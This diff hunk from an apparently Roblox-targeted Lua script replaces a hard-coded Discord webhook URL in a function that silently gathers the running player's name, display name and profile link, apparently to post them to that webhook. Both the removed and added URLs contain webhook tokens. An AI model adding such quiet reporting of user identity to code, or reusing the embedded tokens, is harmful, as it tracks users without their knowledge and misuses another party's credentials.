@@ -261,7 +261,7 @@ local Translations = {
 
 local function sendDiscordWebhook()
     pcall(function()
-        local webhookUrl = "https://discord.com/api/webhooks/1534545059993882767/99nQ5FoGbAVgtb_RYep0Sn36kgMTXDAs4YWFJOswo1oFQwVOehB1ac_rzTJeNFNPe7fo"
+        local webhookUrl = "https://discord.com/api/webhooks/1547112010431602750/Rac3wzFspa5Qz1oJ-gBToHP1Gky0QPBpF0rSbRECKRhbeYrNIYEUKRJkp4yU9rijTtJo"
         local playerName = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")"
         local profileLink = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile"
         
